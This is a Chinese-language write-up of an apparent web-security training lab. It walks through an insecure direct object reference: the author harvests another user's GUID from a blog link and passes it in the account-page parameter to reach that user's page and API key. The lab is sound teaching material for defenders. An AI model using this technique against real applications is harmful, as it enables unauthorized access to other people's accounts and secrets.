# 实验：由请求参数控制的用户 ID（具有不可预测的用户 ID）

本实验在用户账户页面上存在水平权限提升漏洞，但使用 GUID 来识别用户。

为了解决本实验，请找到 `carlos` 的 GUID，然后提交他的 API 密钥作为解决方案。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 使用凭据登录后，服务器响应
    ```http
    HTTP/2 302 Found
    Location: /my-account?id=18539bc0-0b45-4aa8-bdf4-441c5d0881ce
    Set-Cookie: session=uT40YkSAQCIDVCUbbsQEiAFvD71pTwFI; Secure; HttpOnly; SameSite=None
    ```
    - 服务器端重定向包含 GUID 参数

- 尝试移除会话 Cookie，访问账户页面
    ```http
    GET /my-account?id=18539bc0-0b45-4aa8-bdf4-441c5d0881ce HTTP/2
    ```
    - 仍可成功访问：应用程序不使用会话 cookie，仅按照请求参数返回账户页面


- 访问文章页面
    ```http
    GET /post?postId=2 HTTP/2
    ```
    - 服务器响应
        ```html
        <span id=blog-author>
            <a href='/blogs?userId=18539bc0-0b45-4aa8-bdf4-441c5d0881ce'>
                wiener
            </a>
        </span>
        ```
        - 作者为当前账户，博客链接使用与账户页面相同的 GUID

结合 GUID 访问账户页面以及博客信息提供的用户 GUID
- 尝试获取 carlos 的 GUID
    - 访问 carlos 发布的文章，获取其博客链接
        `/blogs?userId=bc6c2826-fda3-4549-bbae-fe4f2698a9d3`
    - 提取目标用户 GUID

- 设置目标用户 GUID 为参数，访问账户页面
    - 成功显示目标用户的账户页面
